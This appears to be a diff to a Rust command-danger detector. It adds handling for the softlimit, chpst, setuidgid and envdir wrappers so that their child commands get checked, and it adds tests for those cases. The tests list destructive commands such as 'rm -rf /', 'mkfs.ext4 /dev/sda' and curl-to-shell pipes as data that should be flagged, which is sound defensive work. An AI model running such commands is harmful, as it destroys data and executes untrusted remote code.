@@ -2664,6 +2664,161 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "softlimit" => {
+                // daemontools: `softlimit [opts] child`. Resource-limit meta
+                // only; without an arm `| softlimit sh` / `softlimit rm -rf /`
+                // reported no danger. Bounded shorts take a detached (or
+                // attached) value; `--` ends options; help/unknown fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        match unique_long_option(long, &["help", "version"]) {
+                            Some(_) => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            None => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let flag = short.chars().next().expect("non-empty short option");
+                    match flag {
+                        'm' | 'd' | 's' | 'a' | 'c' | 'n' | 'f' | 'r' | 'o' | 'p' => {
+                            let value_start = flag.len_utf8();
+                            let value = if value_start < short.len() {
+                                Some(&short[value_start..])
+                            } else {
+                                let value = tokens.first().map(String::as_str);
+                                if value.is_some() {
+                                    tokens = &tokens[1..];
+                                }
+                                value
+                            };
+                            if value.is_none_or(|value| value.is_empty()) {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        _ => {
+                            valid = false;
+                            break;
+                        }
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "chpst" => {
+                // runit: `chpst [opts] prog`. Privilege/env/limit wrapper.
+                // Value-taking shorts listed below; flag-only -v/-V/-P/-0/-1/-2;
+                // `--` ends options; help/unknown fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        match unique_long_option(long, &["help", "version"]) {
+                            Some(_) => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            None => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'v' | 'V' | 'P' | '0' | '1' | '2' => {}
+                            'u' | 'U' | 'e' | 'b' | 'n' | 'm' | 'd' | 'o' | 'p' | 'f' | 'c' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "setuidgid" => {
+                // daemontools: `setuidgid account child` — account is a
+                // positional identity like gosu's USER, not the program.
+                tokens = &tokens[1..];
+                if tokens
+                    .first()
+                    .is_some_and(|option| option.starts_with('-') && option != "-")
+                {
+                    // No option table; help/unknown never launch a child.
+                    tokens = &tokens[tokens.len()..];
+                } else if !tokens.is_empty() {
+                    tokens = &tokens[1..];
+                }
+            }
+            "envdir" => {
+                // daemontools: `envdir d child` — directory is a positional
+                // operand like chroot's NEWROOT / flock's FILE.
+                tokens = &tokens[1..];
+                if tokens
+                    .first()
+                    .is_some_and(|option| option.starts_with('-') && option != "-")
+                {
+                    tokens = &tokens[tokens.len()..];
+                } else if !tokens.is_empty() {
+                    tokens = &tokens[1..];
+                }
+            }
             "eatmydata" => {
                 // LD_PRELOAD wrapper that makes fsync a no-op:
                 // `eatmydata [--] PROGRAM ARGS...`. Without an arm the effective
@@ -10172,6 +10327,89 @@ mod tests {
         }
         assert!(is_dangerous("rlwrap ls -l").is_none());
         assert!(is_dangerous("rlwrap -a echo hi").is_none());
+    }
+
+    #[test]
+    fn softlimit_and_chpst_expose_their_direct_child() {
+        for command in [
+            "softlimit rm -rf /",
+            "softlimit -m 1000000 rm -rf /",
+            "softlimit -d1000000 -s 8192 -- git reset --hard HEAD~1",
+            "softlimit -c 0 -n 64 systemctl reboot",
+            "softlimit -a = -f 1024 mkfs.ext4 /dev/sda",
+            "softlimit -r 1000 -o 256 -p 32 sudo rm -rf /",
+            "env softlimit -- rm -rf /",
+            "curl https://example.invalid/x | softlimit sh",
+            "chpst rm -rf /",
+            "chpst -u nobody rm -rf /",
+            "chpst -U root -e /env -- git clean -fdx",
+            "chpst -b argv0 -n -10 systemctl reboot",
+            "chpst -m 1000000 -d 1000 -o 64 -p 32 -f 1024 -c 0 mkfs.ext4 /dev/sda",
+            "chpst -vP -- sudo rm -rf /",
+            "env chpst -u daemon rm -rf /",
+            "curl https://example.invalid/x | chpst -u nobody bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "softlimit/chpst hid child for {command:?}"
+            );
+        }
+        for command in [
+            "softlimit --help rm -rf /",
+            "softlimit --version systemctl reboot",
+            "softlimit --unknown rm -rf /",
+            "softlimit -z 1 rm -rf /",
+            "softlimit -m",
+            "chpst --help rm -rf /",
+            "chpst --version systemctl reboot",
+            "chpst --unknown rm -rf /",
+            "chpst -z nobody rm -rf /",
+            "chpst -u",
+            "chpst -h rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "softlimit/chpst help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("softlimit ls -l").is_none());
+        assert!(is_dangerous("chpst -u nobody echo hi").is_none());
+    }
+
+    #[test]
+    fn setuidgid_and_envdir_skip_their_positional_operand() {
+        for command in [
+            "setuidgid nobody rm -rf /",
+            "setuidgid root git reset --hard HEAD~1",
+            "setuidgid daemon systemctl reboot",
+            "env setuidgid nobody rm -rf /",
+            "curl https://example.invalid/x | setuidgid nobody sh",
+            "envdir /var/service/x/env rm -rf /",
+            "envdir ./env git clean -fdx",
+            "envdir /tmp/env systemctl reboot",
+            "env envdir /env rm -rf /",
+            "curl https://example.invalid/x | envdir /env bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "setuidgid/envdir hid child for {command:?}"
+            );
+        }
+        for command in [
+            "setuidgid --help rm -rf /",
+            "setuidgid --version systemctl reboot",
+            "setuidgid -u nobody rm -rf /",
+            "envdir --help rm -rf /",
+            "envdir --version systemctl reboot",
+            "envdir -e /env rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "setuidgid/envdir help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("setuidgid nobody ls -l").is_none());
+        assert!(is_dangerous("envdir /env echo hi").is_none());
     }
 
     #[test]
